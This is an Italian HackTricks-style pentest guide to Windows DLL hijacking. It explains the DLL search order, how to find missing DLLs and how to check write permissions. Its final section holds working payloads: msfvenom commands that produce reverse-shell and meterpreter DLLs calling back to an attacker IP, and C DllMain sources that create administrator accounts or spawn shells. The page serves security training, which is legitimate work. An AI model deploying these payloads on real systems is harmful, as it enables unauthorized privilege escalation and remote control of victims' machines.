# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

Il DLL Hijacking comporta la manipolazione di un'applicazione fidata per caricare un DLL malevolo. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection e Side-Loading**. È principalmente utilizzato per l'esecuzione di codice, per ottenere persistenza e, meno comunemente, per l'escalation dei privilegi. Nonostante l'attenzione sull'escalation qui, il metodo di hijacking rimane coerente attraverso gli obiettivi.

### Tecniche comuni

Vengono impiegati diversi metodi per il DLL hijacking, ciascuno con la propria efficacia a seconda della strategia di caricamento del DLL dell'applicazione:

1. **Sostituzione del DLL**: Sostituire un DLL genuino con uno malevolo, utilizzando eventualmente il DLL Proxying per preservare la funzionalità del DLL originale.
2. **Hijacking dell'ordine di ricerca del DLL**: Posizionare il DLL malevolo in un percorso di ricerca prima di quello legittimo, sfruttando il modello di ricerca dell'applicazione.
3. **Hijacking del DLL fantasma**: Creare un DLL malevolo affinché un'applicazione lo carichi, pensando che sia un DLL richiesto non esistente.
4. **Reindirizzamento del DLL**: Modificare i parametri di ricerca come `%PATH%` o i file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione al DLL malevolo.
5. **Sostituzione del DLL WinSxS**: Sostituire il DLL legittimo con un corrispondente malevolo nella directory WinSxS, un metodo spesso associato al side-loading del DLL.
6. **Hijacking del DLL con percorso relativo**: Posizionare il DLL malevolo in una directory controllata dall'utente con l'applicazione copiata, somigliante alle tecniche di Binary Proxy Execution.

## Trovare DLL mancanti

Il modo più comune per trovare DLL mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrare solo l'**Attività del File System**:

![](<../../../images/image (153).png>)

Se stai cercando **DLL mancanti in generale**, puoi **lasciarlo** in esecuzione per alcuni **secondi**.\
Se stai cercando un **DLL mancante all'interno di un eseguibile specifico**, dovresti impostare **un altro filtro come "Nome processo" "contiene" "\<nome eseguibile>", eseguirlo e fermare la cattura degli eventi**.

## Sfruttare DLL mancanti

Per poter elevare i privilegi, la migliore possibilità che abbiamo è quella di **scrivere un DLL che un processo privilegiato cercherà di caricare** in alcuni **luoghi dove verrà cercato**. Pertanto, saremo in grado di **scrivere** un DLL in una **cartella** dove il **DLL viene cercato prima** della cartella dove si trova il **DLL originale** (caso strano), oppure saremo in grado di **scrivere in una cartella dove il DLL verrà cercato** e il **DLL originale non esiste** in alcuna cartella.

### Ordine di ricerca del DLL

**All'interno della** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come i DLL vengono caricati specificamente.**

**Le applicazioni Windows** cercano i DLL seguendo un insieme di **percorsi di ricerca predefiniti**, aderendo a una particolare sequenza. Il problema del DLL hijacking sorge quando un DLL dannoso è posizionato strategicamente in una di queste directory, assicurando che venga caricato prima del DLL autentico. Una soluzione per prevenire questo è garantire che l'applicazione utilizzi percorsi assoluti quando si riferisce ai DLL di cui ha bisogno.

Puoi vedere l'**ordine di ricerca del DLL sui sistemi a 32 bit** qui sotto:

1. La directory da cui è stato caricato l'applicativo.
2. La directory di sistema. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory. (_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste una funzione che ottiene il percorso di questa directory, ma viene cercata. (_C:\Windows\System_)
4. La directory di Windows. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile di ambiente PATH. Nota che questo non include il percorso per applicazione specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene utilizzata quando si calcola il percorso di ricerca del DLL.

Questo è l'**ordine di ricerca predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (il predefinito è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **un DLL potrebbe essere caricato indicando il percorso assoluto invece del solo nome**. In tal caso, quel DLL è **cercato solo in quel percorso** (se il DLL ha dipendenze, queste verranno cercate come se fossero state caricate solo per nome).

Ci sono altri modi per alterare i modi di alterare l'ordine di ricerca, ma non li spiegherò qui.

#### Eccezioni all'ordine di ricerca del DLL dalla documentazione di Windows

Alcune eccezioni all'ordine di ricerca standard del DLL sono annotate nella documentazione di Windows:

- Quando si incontra un **DLL che condivide il proprio nome con uno già caricato in memoria**, il sistema salta la ricerca abituale. Invece, esegue un controllo per il reindirizzamento e un manifesto prima di tornare al DLL già in memoria. **In questo scenario, il sistema non esegue una ricerca per il DLL**.
- Nei casi in cui il DLL è riconosciuto come un **DLL noto** per la versione corrente di Windows, il sistema utilizzerà la sua versione del DLL noto, insieme a qualsiasi DLL dipendente, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di questi DLL noti.
- Se un **DLL ha dipendenze**, la ricerca di questi DLL dipendenti viene condotta come se fossero indicati solo dai loro **nomi di modulo**, indipendentemente dal fatto che il DLL iniziale sia stato identificato tramite un percorso completo.

### Elevare i privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale), che **manca di un DLL**.
- Assicurarsi che sia disponibile **accesso in scrittura** per qualsiasi **directory** in cui il **DLL** sarà **cercato**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del percorso di sistema.

Sì, i requisiti sono complicati da trovare poiché **per impostazione predefinita è piuttosto strano trovare un eseguibile privilegiato mancante di un DLL** ed è ancora **più strano avere permessi di scrittura su una cartella di sistema** (non puoi per impostazione predefinita). Ma, in ambienti mal configurati, questo è possibile.\
Nel caso tu sia fortunato e ti trovi a soddisfare i requisiti, potresti controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se il **principale obiettivo del progetto è bypassare UAC**, potresti trovare lì un **PoC** di un Dll hijacking per la versione di Windows che puoi utilizzare (probabilmente cambiando solo il percorso della cartella in cui hai permessi di scrittura).

Nota che puoi **controllare i tuoi permessi in una cartella** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare le importazioni di un eseguibile e le esportazioni di un dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abuse Dll Hijacking per escalare privilegi** con permessi di scrittura in una **cartella di System Path**, controlla:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) controllerà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatizzati interessanti per scoprire questa vulnerabilità sono le **funzioni di PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Nel caso tu trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare un dll che esporta almeno tutte le funzioni che l'eseguibile importerà da esso**. Comunque, nota che Dll Hijacking è utile per [escalare da Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/#uac) o da [**High Integrity a SYSTEM**](../#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare un dll valido** all'interno di questo studio di dll hijacking focalizzato sul dll hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **prossima sezione** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **modelli** o per creare un **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dlls**

### **Dll Proxifying**

Fondamentalmente, un **Dll proxy** è un Dll capace di **eseguire il tuo codice malevolo quando caricato** ma anche di **esporre** e **funzionare** come **previsto** **inoltrando tutte le chiamate alla vera libreria**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxificare e **generare un dll proxificato** oppure **indicare il Dll** e **generare un dll proxificato**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86 non ho visto una versione x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che in diversi casi il Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima; se queste funzioni non esistono, il **binario non sarà in grado di caricarle** e l'**exploit fallirà**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Riferimenti

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


{{#include ../../../banners/hacktricks-training.md}}
